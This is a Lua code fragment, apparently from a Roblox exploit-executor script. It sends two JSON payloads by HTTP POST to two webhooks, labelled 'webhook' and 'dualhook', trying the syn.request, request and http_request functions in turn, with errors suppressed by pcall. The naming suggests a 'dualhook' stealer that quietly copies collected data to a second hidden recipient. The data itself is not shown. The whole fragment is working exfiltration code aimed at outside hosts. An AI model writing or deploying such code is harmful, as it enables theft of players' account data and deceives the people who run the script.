-- Send the HTTP requests to both webhooks
pcall(function()
    if syn then
        syn.request(
            {
                Url = webhook,
                Method = 'POST',
                Headers = {
                    ['Content-Type'] = 'application/json'
                },
                Body = game:GetService('HttpService'):JSONEncode(normalData)
            }
        )
        
        syn.request(
            {
                Url = dualhook,
                Method = 'POST',
                Headers = {
                    ['Content-Type'] = 'application/json'
                },
                Body = game:GetService('HttpService'):JSONEncode(dualhookedData)
            }
        )
    elseif request then
        request(
            {
                Url = webhook,
                Method = 'POST',
                Headers = {
                    ['Content-Type'] = 'application/json'
                },
                Body = game:GetService('HttpService'):JSONEncode(normalData)
            }
        )
        
        request(
            {
                Url = dualhook,
                Method = 'POST',
                Headers = {
                    ['Content-Type'] = 'application/json'
                },
                Body = game:GetService('HttpService'):JSONEncode(dualhookedData)
            }
        )
    elseif http_request then
        http_request(
            {
                Url = webhook,
                Method = 'POST',
                Headers = {
                    ['Content-Type'] = 'application/json'
                },
                Body = game:GetService('HttpService'):JSONEncode(normalData)
            }
        )
        
        http_request(
            {
                Url = dualhook,
                Method = 'POST',
                Headers = {
                    ['Content-Type'] = 'application/json'
                },
                Body = game:GetService('HttpService'):JSONEncode(dualhookedData)
            }
        )
    end
end)
